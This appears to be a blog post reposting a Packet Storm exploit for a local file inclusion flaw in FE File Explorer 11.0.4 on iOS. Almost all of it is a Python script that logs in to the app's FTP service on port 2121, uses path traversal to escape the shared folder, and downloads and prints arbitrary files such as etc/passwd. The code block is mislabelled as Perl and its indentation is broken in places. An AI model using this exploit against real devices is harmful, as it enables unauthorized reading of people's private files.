---
layout: post
title: FE File Explorer 11.0.4
date: 2022-09-07 03:37 +0300
categories: [Exploits, File Inclusion]
tags: [exploits]
---








![](../../../assets/img/Exploits/fileexp.png)

There is a local file inclusion vulnerability present in version 11.0.4 of FE File Explorer.

  

```
SHA-256 | 9596719bde6a381ce9f18435b2517e8ecf2d1838ab031974d2c37d361f760254
```

```perl
    # Exploit Title: FE File Explorer 11.0.4 Local File inclusion
    # Date: Sep 6, 2022
    # Exploit Author: Chokri Hammedi
    # Vendor Homepage: https://www.skyjos.com/
    # Software Link:
    https://apps.apple.com/us/app/fe-file-explorer-file-manager/id510282524
    # Version: 11.0.4
    # Tested on: iPhone ios 15.6
    
    
    from ftplib import FTP
    import argparse
    
    help = " FE File Explorer Local File inclusion"
    parser = argparse.ArgumentParser(description=help)
    parser.add_argument("--target", help="Target IP", required=True)
    parser.add_argument("--file", help="File To Open eg: etc/passwd")
    
    args = parser.parse_args()
    
    
    ip = args.target
    port = 2121 # Default Port
    files = args.file
    
    
    
    ftpConnection = FTP()
    ftpConnection.connect(host=ip, port=port)
    ftpConnection.login();
    
    def downloadFile():
    
    ftpConnection.cwd('/../../../../../../../../../../../../../../../../')
            ftpConnection.retrbinary(f"RETR {files}", open('data.txt',
    'wb').write)
            ftpConnection.close()
            file = open('data.txt', 'r')
            print (f"[***] The contents of {files}\n")
            print (file.read())
    
    downloadFile()
```
{: .nolineno }

<br>  

>*Source* :   [https://packetstormsecurity.com](https://packetstormsecurity.com)
